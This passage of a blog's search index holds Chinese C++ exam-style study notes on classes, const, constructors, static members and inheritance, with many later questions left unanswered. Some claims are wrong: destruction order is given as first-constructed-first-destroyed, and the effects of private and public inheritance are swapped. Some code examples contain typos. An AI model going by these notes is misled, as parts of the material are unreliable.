class="keyword">private</span>:</span><br><span class="line">	私有的数据和成员函数;</span><br><span class="line"><span class="keyword">public</span>:</span><br><span class="line">	公用的数据和成员函数;</span><br><span class="line"><span class="keyword">protected</span>:</span><br><span class="line">	受保护的数据和成员函数;</span><br><span class="line">&#125;对象名<span class="number">1</span>,对象名<span class="number">2</span>,...;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<hr>
<h4 id="c-中有哪些权限限定符？各起什么作用？"><a href="#c-中有哪些权限限定符？各起什么作用？" class="headerlink" title="c++中有哪些权限限定符？各起什么作用？"></a>c++中有哪些权限限定符？各起什么作用？</h4><ul>
<li><strong>private</strong><blockquote>
<p>private将成员声明为<strong>私有成员</strong>，只能被<strong>本类中的成员函数</strong>引用，类外不能调用(友元类除外)。</p>
</blockquote>
</li>
<li><strong>public</strong><blockquote>
<p>public将成员声明为<strong>公有成员</strong>，既可以被<strong>本类成员函数</strong>所引用，也可以被<strong>类的作用域内的其他函数</strong>所引用。</p>
</blockquote>
</li>
<li><strong>protected</strong><blockquote>
<p>protected将成员声明为<strong>受保护成员</strong>，不能被类外访问，但是可以被<strong>派生类的成员函数</strong>访问。</p>
</blockquote>
</li>
</ul>
<hr>
<h4 id="什么是类的封装？封装的原则是什么？"><a href="#什么是类的封装？封装的原则是什么？" class="headerlink" title="什么是类的封装？封装的原则是什么？"></a>什么是类的封装？封装的原则是什么？</h4><ul>
<li><strong>1、什么是封装？</strong><blockquote>
<p><strong>封装</strong>可以隐藏实现细节，使代码模块化。<br><strong>封装</strong>是把过程和数据包围起来，对数据的访问只能通过已定义的界面。<br>在面向对象编程上可理解为:把客观事物封装成抽象的类，并且类可以把自己的数据和方法只让可信的类或者对象操作，对不可信的进行信息隐藏。</p>
</blockquote>
</li>
<li><strong>2、封装的原则是什么？</strong><blockquote>
<p><strong>简化用户接口，隐藏实现细节，这个是封装的根本目的。</strong><br>封装的难点在于如何设计接口。<br><strong>其一</strong>:必须保证接口是功能的全集，即接口能够覆盖所有需求。不能完成必要功能的封装是没有意义的。<br><strong>其二</strong>:尽量使接口是最小冗余的。这是为了简化类使用者的学习和使用，难用的接口是最容易让人遗忘的。冗余接口的存在是被允许的，但必须保证冗余接口是有效的。也就是说，增加冗余接口会带来很大的好处，比如性能的飞升。<br><strong>其三</strong>:要保证接口是稳定的，将接口和实现分离，并将实现隐藏，就是为了能保护类使用者在类的实现细节改变的情况下，不必随时修改。一旦接口被公布，永远也不要改变它。</p>
</blockquote>
</li>
</ul>
<hr>
<h4 id="同一个类所定义的不同对象在调用同一个成员函数时，调用的是同一段代码吗？通过什么来区分各自的数据？"><a href="#同一个类所定义的不同对象在调用同一个成员函数时，调用的是同一段代码吗？通过什么来区分各自的数据？" class="headerlink" title="同一个类所定义的不同对象在调用同一个成员函数时，调用的是同一段代码吗？通过什么来区分各自的数据？"></a>同一个类所定义的不同对象在调用同一个成员函数时，调用的是同一段代码吗？通过什么来区分各自的数据？</h4><ul>
<li><blockquote>
<p><strong>是同一段代码</strong>。</p>
</blockquote>
</li>
<li><blockquote>
<p><strong>通过this指针</strong>:每一个成员函数中都包括这个指针的名字是固定的，称为this。<strong>它是指向对象的指针，他的值是当前被调用的成员函数所在的对象的起始地址</strong>。<br>例:</p>
</blockquote>
<figure class="highlight arduino"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> Box::volume()&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">height</span> * <span class="built_in">width</span> * length);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//C++把它处理为:</span></span><br><span class="line"><span class="keyword">int</span> Box::volume(Box * <span class="keyword">this</span>)&#123;</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">this</span>-&gt;<span class="built_in">height</span> * <span class="keyword">this</span>-&gt;<span class="built_in">width</span> * <span class="keyword">this</span>-&gt;length);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<hr>
<h4 id="类的成员函数和普通全局函数在形式上有什么区别？在本质上有什么区别？"><a href="#类的成员函数和普通全局函数在形式上有什么区别？在本质上有什么区别？" class="headerlink" title="类的成员函数和普通全局函数在形式上有什么区别？在本质上有什么区别？"></a>类的成员函数和普通全局函数在形式上有什么区别？在本质上有什么区别？</h4><ul>
<li><blockquote>
<p><strong>区别</strong>1:静态成员函数实际上是一个全局函数,不依赖一个类的对象. 而属于类，不创建对象也可调用，静态成员函数没有this指针。普通成员函数依赖一个类的对象,也就是它有一个隐藏的调用参数(this)指针,必须指向一个类的对象。</p>
</blockquote>
</li>
<li><blockquote>
<p><strong>区别2</strong>:静态函数只能访问类中的静态成员变量；</p>
</blockquote>
</li>
<li><blockquote>
<p><strong>区别3</strong>:如果成员函数想作为回调函数来使用，如创建线程等，一般只能将它定义为静态成员函数才行。</p>
</blockquote>
</li>
</ul>
<hr>
<h3 id="三、类和对象的进一步讨论"><a href="#三、类和对象的进一步讨论" class="headerlink" title="三、类和对象的进一步讨论"></a><font color="DarkViolet"><center>三、类和对象的进一步讨论</center></font></h3><hr>
<h4 id="构造函数、析构函数的英文单词是什么？"><a href="#构造函数、析构函数的英文单词是什么？" class="headerlink" title="构造函数、析构函数的英文单词是什么？"></a>构造函数、析构函数的英文单词是什么？</h4><ul>
<li><blockquote>
<p><strong>构造函数——constructor</strong></p>
</blockquote>
</li>
<li><blockquote>
<p><strong>析构函数——destructor</strong></p>
</blockquote>
</li>
</ul>
<hr>
<h4 id="构造函数的特点是什么？析构函数的特点是什么？"><a href="#构造函数的特点是什么？析构函数的特点是什么？" class="headerlink" title="构造函数的特点是什么？析构函数的特点是什么？"></a>构造函数的特点是什么？析构函数的特点是什么？</h4><ul>
<li><blockquote>
<p>c++提供构造函数，来处理对象的初始化。构造函数是一种<strong>特殊的成员函数</strong>，与其他成员函数不同，不需要用户来调用它，而是在建立对象时自动执行。构造函数只是起初始化值的作用，但实例化一个对象的时候，可以通过实例去传递参数，从主函数传递到其他的函数里面，这样就使其他的函数里面有值了。规则，只要你一实例化对象，系统自动回调用一个构造函数，就算不写，编译器也自动调用一次。</p>
</blockquote>
</li>
<li><blockquote>
<p>析构函数与构造函数同名，但该函数前面加~。析构函数<strong>没有参数</strong>，也<strong>没有返回值</strong>，而且<strong>不能重载</strong>，在<strong>一个类中只能有一个析构函数</strong>。当<strong>撤销对象时，编译器也会自动调用析构函数</strong>。<strong>每一个类必须有一个析构函数</strong>，用户可以自定义析构函数，也可以是编译器自动生成默认的析构函数。一般析构函数定义为类的公有成员。</p>
</blockquote>
</li>
</ul>
<hr>
<h4 id="构造函数、析构函数的执行顺序是什么？"><a href="#构造函数、析构函数的执行顺序是什么？" class="headerlink" title="构造函数、析构函数的执行顺序是什么？"></a>构造函数、析构函数的执行顺序是什么？</h4><ul>
<li><blockquote>
<p><strong>先构造的先执行析构</strong>。</p>
</blockquote>
</li>
</ul>
<hr>
<h4 id="在C语言中，我们说main-函数是程序的入口，是最先被调用的函数，在C-中情况是这样吗？如果不是请说明原因，并举出实例。"><a href="#在C语言中，我们说main-函数是程序的入口，是最先被调用的函数，在C-中情况是这样吗？如果不是请说明原因，并举出实例。" class="headerlink" title="在C语言中，我们说main()函数是程序的入口，是最先被调用的函数，在C++中情况是这样吗？如果不是请说明原因，并举出实例。"></a>在C语言中，我们说main()函数是程序的入口，是最先被调用的函数，在C++中情况是这样吗？如果不是请说明原因，并举出实例。</h4><ul>
<li><blockquote>
<p><strong>c++中不是这样</strong>。</p>
</blockquote>
</li>
<li><blockquote>
<p>因为存在构造数据类型的定义对象定义，且对象为全局对象的话，则该类对象所属的构造类型的构造函数在main()函数之前执行。</p>
</blockquote>
</li>
</ul>
<hr>
<h4 id="const关键字"><a href="#const关键字" class="headerlink" title="const关键字"></a>const关键字</h4><center><strong><font color="Crimson" size="6">const在c++中要尽可能的使用</font></strong></center>

<style>
table th:first-of-type {
width:30%;
}
</style>

<table>
<thead>
<tr>
<th align="center">形式</th>
<th align="center">含义</th>
</tr>
</thead>
<tbody><tr>
<td align="center"><code>Time const t1;</code></td>
<td align="center">t1是常对象，其值在任何情况下都不能改变</td>
</tr>
<tr>
<td align="center"><code>void Time::fun()const;</code></td>
<td align="center">fun是Time类中的成员函数，可以引用，但不能修改本类中的成员数据</td>
</tr>
<tr>
<td align="center"><code>Time * const p;</code></td>
<td align="center">p是指向time类对象的常指针变量，p的值(p的指向)不能改变</td>
</tr>
<tr>
<td align="center"><code>const Time * p;</code></td>
<td align="center">p是指向Time类常对象的指针变量，p指向的类对象的值不能通过p来改变</td>
</tr>
<tr>
<td align="center"><code>const Time &amp;t1 = t;</code></td>
<td align="center">t1是Time类对象t的引用，二者指向同一储存空间，t的值不能改变</td>
</tr>
<tr>
<td align="center">- &gt; const的作用是:<strong>数据的保护</strong></td>
<td align="center"></td>
</tr>
<tr>
<td align="center">- 常成员变量</td>
<td align="center"></td>
</tr>
</tbody></table>
<blockquote>
<p>类的常成员变量是用const关键字声明的成员变量，<strong>其值不可改变</strong>，它的<strong>初始值必须通过构造函数的初始化列表方式完成</strong>。一般将一个类中不可改变的值声明为常成员变量。<br>但const成员变量有一个缺点:该类的所有对象都会const成员变量，而不是整个类共用一个。这种情况下，const常和static一起使用。</p>
<ul>
<li>const成员函数<br>const成员函数语法为:<code>int Obj::Func const;</code>这表明成员函数Func const是个常成员函数，它的作用是表明<strong>只能引用类中的数据成员</strong>，而<strong>不能修改类中的数据成员</strong>。</li>
<li>常对象<br>语法为:<code>const obj o(10);</code> 或 <code>obj const o(10);</code><br>用const声明的对象为常对象，常对象必须初始化，<br>如果一个对象被声明为const对象，则该对象的数据成员不可修改。即const对象不能调用该对象的非const成员函数。</li>
<li>指向const数据的指针<br>定义指针时，在指针的类型<strong>前面</strong>加上const表明该指针指向的对象是个常量。</li>
<li>const指针<br>在定义指针时，在指针的<strong>前面</strong>加上const表明该指针是一个常量，它必须被初始化。</li>
<li>const在参数中的使用<br>const在参数类型为指针或引用时经常被使用，这表明这个指针或引用所指向的数据不允许被修改，这样就保证了在被调函数中不能因为误操作而改变了主调函数中的值。</li>
</ul>
</blockquote>
<hr>
<h4 id="初始化列表的语法是怎样的？"><a href="#初始化列表的语法是怎样的？" class="headerlink" title="初始化列表的语法是怎样的？"></a>初始化列表的语法是怎样的？</h4><ul>
<li>如下:<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">类名::构造函数名(<span class="literal">[参数表]</span>)<span class="literal">[:成员初始化表]</span>&#123;</span><br><span class="line"><span class="literal">[构造函数体]</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//例:</span></span><br><span class="line"><span class="keyword">class</span> Student&#123;</span><br><span class="line">public:</span><br><span class="line">    <span class="constructor">Student(<span class="params">int</span> <span class="params">n</span>, <span class="params">char</span> <span class="params">s</span>, <span class="params">nam</span>[])</span>:num(n), sex(s)&#123;</span><br><span class="line">        strcpy(name, nam);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">int</span> num;</span><br><span class="line">    <span class="built_in">char</span> sex;</span><br><span class="line">    <span class="built_in">int</span> name<span class="literal">[<span class="number">20</span>]</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<hr>
<h4 id="在C-中为什么使用new-delete，而不是malloc-free-来来动态创建对象？如何使用new-delete来动态创建数组？"><a href="#在C-中为什么使用new-delete，而不是malloc-free-来来动态创建对象？如何使用new-delete来动态创建数组？" class="headerlink" title="在C++中为什么使用new/delete，而不是malloc()/free()来来动态创建对象？如何使用new/delete来动态创建数组？"></a>在C++中为什么使用new/delete，而不是malloc()/free()来来动态创建对象？如何使用new/delete来动态创建数组？</h4><ul>
<li><blockquote>
<p>c语言中使用库函数malloc()和free()来动态申请和释放内存空间，但是存在两个问题:<br>1、分配的大小需人为计算;<br>2、只分配空间，而不涉及类型。<br>c++使用了运算符new和delete来取代malloc()和free()函数。<strong>动态分配/释放内存</strong>。</p>
</blockquote>
</li>
<li>例:动态创建一维数组<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n;</span><br><span class="line">    <span class="built_in">cin</span> &gt;&gt; n;</span><br><span class="line">    <span class="comment">//动态分配一维数组</span></span><br><span class="line">    <span class="keyword">int</span> *arr = <span class="keyword">new</span> <span class="keyword">int</span> [n];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">  	  <span class="built_in">cin</span> &gt;&gt; arr[i];</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">  	  <span class="built_in">cout</span> &lt;&lt; arr[i] &lt;&lt; <span class="string">" "</span>;</span><br><span class="line">    <span class="comment">//释放arr数组</span></span><br><span class="line">    <span class="keyword">delete</span>[] arr;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<hr>
<h4 id="什么是对象的复制？什么是对象的赋值？"><a href="#什么是对象的复制？什么是对象的赋值？" class="headerlink" title="什么是对象的复制？什么是对象的赋值？"></a>什么是对象的复制？什么是对象的赋值？</h4><ul>
<li>对象的赋值<blockquote>
<p>一般形式:<code>对象名1 = 对象名2；</code><br><strong>对象的赋值只是用赋值号右边的对象的数据覆盖了赋值号左边的的对象的数据成员</strong>。因此必须使用有默认参数值的构造函数，以保证左值能被初始化。</p>
</blockquote>
</li>
<li>对象的复制<blockquote>
<p>一般形式:<code>类名 对象2(对象1)；</code> 或 `类名 对象2 = 对象1;<br>例:</p>
</blockquote>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Student</span>&#123;</span></span><br><span class="line">pubilc:</span><br><span class="line">    Student ()&#123;m_strName=<span class="string">"Jim"</span>;&#125;</span><br><span class="line">    <span class="comment">/*</span></span><br><span class="line"><span class="comment">    默认的拷贝构造函数:</span></span><br><span class="line"><span class="comment">    Student (const Student &amp;stu)&#123;&#125;</span></span><br><span class="line"><span class="comment">    */</span></span><br><span class="line">    Student(<span class="keyword">const</span> Student &amp;stu)&#123;m_strName = stu.m_strName;&#125;</span><br><span class="line">    <span class="comment">//显性定义的拷贝构造函数</span></span><br><span class="line"><span class="keyword">private</span>:</span><br><span class="line">    <span class="built_in">string</span> m_strName;</span><br><span class="line">&#125;;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    Student stu1;</span><br><span class="line">    Student stu2 = stu1;</span><br><span class="line">    <span class="function">Student <span class="title">stu3</span><span class="params">(stu1)</span></span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<hr>
<h4 id="什么是深拷贝-浅拷贝？-拷贝构造函数的语法如何？"><a href="#什么是深拷贝-浅拷贝？-拷贝构造函数的语法如何？" class="headerlink" title="什么是深拷贝/浅拷贝？ 拷贝构造函数的语法如何？"></a>什么是深拷贝/浅拷贝？ 拷贝构造函数的语法如何？</h4><ul>
<li>浅拷贝<blockquote>
<p>对象拷贝时，仅仅是简单的值拷贝，这称为“浅拷贝”，这是系统默认的拷贝模式，不需要编程实现。</p>
</blockquote>
</li>
<li>深拷贝<blockquote>
<p>对象拷贝时，对堆中的数据编程进行拷贝，这称为“深拷贝”，这种拷贝模式需要编程实现。</p>
</blockquote>
</li>
<li><strong>拷贝构造函数</strong><blockquote>
<p>拷贝构造函数中只有哟个参数，为本类对象的一个引用，并通常使用const修饰。<br>语法:</p>
</blockquote>
<figure class="highlight livescript"><table><tr><td class="code"><pre><span class="line">obj(<span class="keyword">const</span> obj &amp;o)&#123;</span><br><span class="line">    <span class="literal">no</span> = o.<span class="literal">no</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">"copy constructor"</span> &lt;&lt; <span class="literal">no</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

</li>
</ul>
<hr>
<h4 id="static数据成员和static成员函数的特点是什么？static成员函数有什么限制？static数据成员如何初始化？"><a href="#static数据成员和static成员函数的特点是什么？static成员函数有什么限制？static数据成员如何初始化？" class="headerlink" title="static数据成员和static成员函数的特点是什么？static成员函数有什么限制？static数据成员如何初始化？"></a>static数据成员和static成员函数的特点是什么？static成员函数有什么限制？static数据成员如何初始化？</h4><ul>
<li><blockquote>
<p><strong>static数据成员</strong>拥有一块单独的储存区(不再类对象内部)，不管该类创造了多少个对象。所有该类的对象共享这块区域，这就为这些类之间提供了一种相互通信的方法，并且它不会占据对象的储存空间。他的名字是属于类的(例:Circle::PI)，这样可以很大程度上解决全局数据的名字冲突问题。它是有权限控制的，也就是说他可以是private的。</p>
</blockquote>
</li>
<li><blockquote>
<p>除了数据成员能定义为static的，成员函数也可以定义为static的。与static数据成员一样，static成员函数也是属于类的，而不是属于对象的。static成员函数是属于类的，所以它没有this指针，不创建对象就可以被调用。它的这个特点决定了<strong>static成员函数只能访问类中的static数据成员和static成员函数</strong>。与类的static数据成员一样，<strong>推荐使用类方式引用类的static成员函数</strong>。</p>
</blockquote>
</li>
<li><blockquote>
<p>在类内提供的仅仅是static数据成员的声明(编译器没有给它分配空间)，而不是定义，所以不能使用构造函数对其进行初始化，<strong>static数据成员的初始化必须在类外完成</strong>。static数据成员在使用时，既可以使用对象方式引用，也可以使用类方式引用，通常使用类方式引用，以表明它是一个static数据成员。</p>
</blockquote>
</li>
</ul>
<hr>
<h4 id="为什么要使用友元？哪些内容可以作为类的友元？我们对友元的态度是什么？"><a href="#为什么要使用友元？哪些内容可以作为类的友元？我们对友元的态度是什么？" class="headerlink" title="为什么要使用友元？哪些内容可以作为类的友元？我们对友元的态度是什么？"></a>为什么要使用友元？哪些内容可以作为类的友元？我们对友元的态度是什么？</h4><ul>
<li><blockquote>
<p>友元机制可以带来一些便利。</p>
</blockquote>
</li>
<li><blockquote>
<p>友元可以实现在类的外部访问一个类的<strong>private成员</strong></p>
</blockquote>
</li>
<li><blockquote>
<p>友元机制虽然可以带来一些便利，但是它严重破坏了程序的封装性，也有影响程序的可读性，所以要<strong>慎重使用友元</strong>。</p>
</blockquote>
</li>
</ul>
<hr>
<h3 id="四、运算符重载"><a href="#四、运算符重载" class="headerlink" title="四、运算符重载"></a><font color="DarkViolet"><center>四、运算符重载</center></font></h3><hr>
<h4 id="在C-中运算符被当作什么处理？如何重载运算符？重载运算符有什么好处？需要注意哪些问题？运算符重载一般以哪两种方式出现？该如何选择？"><a href="#在C-中运算符被当作什么处理？如何重载运算符？重载运算符有什么好处？需要注意哪些问题？运算符重载一般以哪两种方式出现？该如何选择？" class="headerlink" title="在C++中运算符被当作什么处理？如何重载运算符？重载运算符有什么好处？需要注意哪些问题？运算符重载一般以哪两种方式出现？该如何选择？"></a><a href="https://blog.csdn.net/u013982161/article/details/52830143" target="_blank" rel="noopener">在C++中运算符被当作什么处理？如何重载运算符？重载运算符有什么好处？需要注意哪些问题？运算符重载一般以哪两种方式出现？该如何选择？</a></h4><hr>
<h3 id="五、继承和派生"><a href="#五、继承和派生" class="headerlink" title="五、继承和派生"></a><font color="DarkViolet"><center>五、继承和派生</center></font></h3><hr>
<h4 id="继承的单词是什么？语法如何？继承方式限定符有哪些？作用分别是什么？"><a href="#继承的单词是什么？语法如何？继承方式限定符有哪些？作用分别是什么？" class="headerlink" title="继承的单词是什么？语法如何？继承方式限定符有哪些？作用分别是什么？"></a>继承的单词是什么？语法如何？继承方式限定符有哪些？作用分别是什么？</h4><ul>
<li><blockquote>
<p><strong>继承——inheritance</strong>。继承就是在已有类的基础上建立一个新类的过程。其中已经存在的类称为基类(base class)，新建立的类称为派生类(derived class)，从基类产生派生类的过程称为派生。</p>
</blockquote>
</li>
<li><blockquote>
<p><strong>继承的语法</strong>:</p>
  <figure class="highlight kotlin"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> 派生类名: <span class="type">[继承方式] 基类名 &#123;</span></span></span><br><span class="line">    <span class="comment">//继承方式不写默认是private。</span></span><br><span class="line">    派生类新增加的成员</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</blockquote>
</li>
<li><blockquote>
<p><strong>继承方式限定</strong>:<br>  <strong>private</strong>:基类的公有成员和保护成员在派生类中保持原有访问属性，其私有成员仍为基类私有。<br>  <strong>public</strong>:积累的公有成员和保护成员在派生类中成了私有成员，其私有成员仍为基类私有。<br>  <strong>protected</strong>:积累的公有成员和保护成员在派生类中成了保护成员，其私有成员仍为基类私有。</p>
</blockquote>
</li>
</ul>
<hr>
<h4 id="继承发生时，在派生类的对象内部会有一个基类的对象，这个基类对象的初始化是由基类的构造函数完成的，那么如何在派生类中有选择的调用基类的非默认构造函数呢？"><a href="#继承发生时，在派生类的对象内部会有一个基类的对象，这个基类对象的初始化是由基类的构造函数完成的，那么如何在派生类中有选择的调用基类的非默认构造函数呢？" class="headerlink" title="继承发生时，在派生类的对象内部会有一个基类的对象，这个基类对象的初始化是由基类的构造函数完成的，那么如何在派生类中有选择的调用基类的非默认构造函数呢？"></a>继承发生时，在派生类的对象内部会有一个基类的对象，这个基类对象的初始化是由基类的构造函数完成的，那么如何在派生类中有选择的调用基类的非默认构造函数呢？</h4><ul>
<li><blockquote>
</blockquote>
</li>
</ul>
<hr>
<h4 id="继承发生时，派生类是否全部接收基类的成员？如果不是哪些成员不被继承。"><a href="#继承发生时，派生类是否全部接收基类的成员？如果不是哪些成员不被继承。" class="headerlink" title="继承发生时，派生类是否全部接收基类的成员？如果不是哪些成员不被继承。"></a>继承发生时，派生类是否全部接收基类的成员？如果不是哪些成员不被继承。</h4><ul>
<li><blockquote>
<p><strong>派生类要无条件的接收基类中的全部成员</strong>。</p>
</blockquote>
</li>
<li><blockquote>
<p>派生类尽管拥有基类的所有的成员，但是<strong>派生类不能访问基类private的成员</strong>。</p>
</blockquote>
</li>
</ul>
<hr>
<p><font size="5" color="Orangered"><strong><center>派生类从基类中继承的成员在不同的继承方式下的访问权限</center></strong></font></p>
<center>![](https://hdwena.sn.files.1drv.com/y4mhMErgzce0OjomgHTh_UJda9Dha1RoPDfRdvbQdw6z2vtiulYKo4l89RC8FBLsUEN7NHN0I8-RcpUKyyim93Gtb1ckcUYLDxQnIAAQvIIK2HAC0YOZshMXXpz2INa5S_lq88gY0d1bk8i6uIlXBWPip1S_e2rKV7CueKh7Ykj4faOsqIkFOO4XqpMoESSDg7r3I6OMZTvX4FfIH7X5mQawA?width=944&height=299&cropmode=none)</center>

<hr>
<h4 id="组合-子对象-的作用是什么？如何有选择的调用对象成员的非默认构造函数？组合和继承都可以实现代码重用，那么什么时候选择组合，什么时候选择继承？"><a href="#组合-子对象-的作用是什么？如何有选择的调用对象成员的非默认构造函数？组合和继承都可以实现代码重用，那么什么时候选择组合，什么时候选择继承？" class="headerlink" title="组合(子对象)的作用是什么？如何有选择的调用对象成员的非默认构造函数？组合和继承都可以实现代码重用，那么什么时候选择组合，什么时候选择继承？"></a>组合(子对象)的作用是什么？如何有选择的调用对象成员的非默认构造函数？组合和继承都可以实现代码重用，那么什么时候选择组合，什么时候选择继承？</h4><ul>
<li><blockquote>
<p>子对象就是类对象中内嵌的对象。当派生类中存在子对象时，派生类的构造函数需要依次完成以下3部分:<br>1、先调用基类构造函数初始化基类数据。<br>2、再调用子对象的构造函数初始化子对象中的数据。<br>3、最后初始化自己的数据成员。</p>
</blockquote>
</li>
</ul>
<hr>
<h4 id="当继承和组合都存在时，构造和析构的顺序如何？"><a href="#当继承和组合都存在时，构造和析构的顺序如何？" class="headerlink" title="当继承和组合都存在时，构造和析构的顺序如何？"></a>当继承和组合都存在时，构造和析构的顺序如何？</h4><hr>
<h4 id="哪些地方必须使用初始化列表？"><a href="#哪些地方必须使用初始化列表？" class="headerlink" title="哪些地方必须使用初始化列表？"></a>哪些地方必须使用初始化列表？</h4><hr>
<h4 id="什么是overriding、overload？什么是upcasting？"><a href="#什么是overriding、overload？什么是upcasting？" class="headerlink" title="什么是overriding、overload？什么是upcasting？"></a>什么是overriding、overload？什么是upcasting？</h4><hr>
<h4 id="多继承会带来什么问题？如何解决这个问题？对待多继承的态度是什么？"><a href="#多继承会带来什么问题？如何解决这个问题？对待多继承的态度是什么？" class="headerlink" title="多继承会带来什么问题？如何解决这个问题？对待多继承的态度是什么？"></a>多继承会带来什么问题？如何解决这个问题？对待多继承的态度是什么？</h4><hr>
<h3 id="六、多态性和虚函数"><a href="#六、多态性和虚函数" class="headerlink" title="六、多态性和虚函数"></a><font color="DarkViolet"><center>六、多态性和虚函数</center></font></h3><hr>
<h4 id="什么是多态性？英文单词是什么？它能给我们程序设计带来什么好处？"><a href="#什么是多态性？英文单词是什么？它能给我们程序设计带来什么好处？" class="headerlink" title="什么是多态性？英文单词是什么？它能给我们程序设计带来什么好处？"></a>什么是多态性？英文单词是什么？它能给我们程序设计带来什么好处？</h4><hr>
<h4 id="如何实现多态性？"><a href="#如何实现多态性？" class="headerlink" title="如何实现多态性？"></a>如何实现多态性？</h4><hr>
<h4 id="虚函数是如何实现的-考试不会考-？"><a href="#虚函数是如何实现的-考试不会考-？" class="headerlink" title="虚函数是如何实现的(考试不会考)？"></a>虚函数是如何实现的(考试不会考)？</h4><hr>
<h4 id="动态-静态绑定-binding、联编-的优缺点各是什么？"><a href="#动态-静态绑定-binding、联编-的优缺点各是什么？" class="headerlink" title="动态/静态绑定(binding、联编)的优缺点各是什么？"></a>动态/静态绑定(binding、联编)的优缺点各是什么？</h4><hr>
<h4 id="什么是纯虚函数？什么是抽象类？其意义各自是什么？"><a href="#什么是纯虚函数？什么是抽象类？其意义各自是什么？" class="headerlink" title="什么是纯虚函数？什么是抽象类？其意义各自是什么？"></a>什么是纯虚函数？什么是抽象类？其意义各自是什么？</h4><hr>
<h3 id="七、输入输出流"><a href="#七、输入输出流" class="headerlink" title="七、输入输出流"></a><font color="DarkViolet"><center>七、输入输出流</center></font></h3><hr>
<h4 id="C-I-O的优势在哪-和前面第一章的类似-？"><a href="#C-I-O的优势在哪-和前面第一章的类似-？" class="headerlink" title="C++I/O的优势在哪(和前面第一章的类似)？"></a>C++I/O的优势在哪(和前面第一章的类似)？</h4><hr>
<h4 id="标准输出流有哪些？它们之间的区别是什么？如何控制格式的输出？标准的输入流是什么？"><a href="#标准输出流有哪些？它们之间的区别是什么？如何控制格式的输出？标准的输入流是什么？" class="headerlink" title="标准输出流有哪些？它们之间的区别是什么？如何控制格式的输出？标准的输入流是什么？"></a>标准输出流有哪些？它们之间的区别是什么？如何控制格式的输出？标准的输入流是什么？</h4><hr>
<h4 id="如何使用文件流进行输入-输出-步骤-？"><a href="#如何使用文件流进行输入-输出-步骤-？" class="headerlink" title="如何使用文件流进行输入/输出(步骤)？"></a>如何使用文件流进行输入/输出(步骤)？</h4><hr>
<h4 id="什么是字符串流？它有什么用好处？"><a href="#什么是字符串流？它有什么用好处？" class="headerlink" title="什么是字符串流？它有什么用好处？"></a>什么是字符串流？它有什么用好处？</h4><hr>
<h3 id="八、C-工具"><a href="#八、C-工具" class="headerlink" title="八、C++工具"></a><font color="DarkViolet"><center>八、C++工具</center></font></h3><hr>
<h4 id="实现异常的三个关键字是什么？大致的作用是什么？"><a href="#实现异常的三个关键字是什么？大致的作用是什么？" class="headerlink" title="实现异常的三个关键字是什么？大致的作用是什么？"></a>实现异常的三个关键字是什么？大致的作用是什么？</h4><hr>
]]></content>
      <categories>
        <category>Learning</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
</search>
